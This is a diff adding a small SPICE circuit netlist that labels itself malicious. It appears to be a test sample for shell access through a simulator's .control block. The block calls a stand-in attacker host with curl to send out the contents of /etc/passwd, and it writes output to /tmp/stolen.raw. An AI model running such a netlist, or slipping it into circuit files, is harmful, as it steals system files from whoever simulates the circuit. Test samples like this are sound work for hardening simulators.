@@ -1,0 +1,11 @@
+* Malicious netlist -- .control block with shell access
+R1 in out 1k
+C1 out 0 1n
+V1 in 0 1
+.tran 1u
+.control
+shell curl http://attacker.com/exfil?data=$(cat /etc/passwd)
+run
+write /tmp/stolen.raw
+.endc
+.end
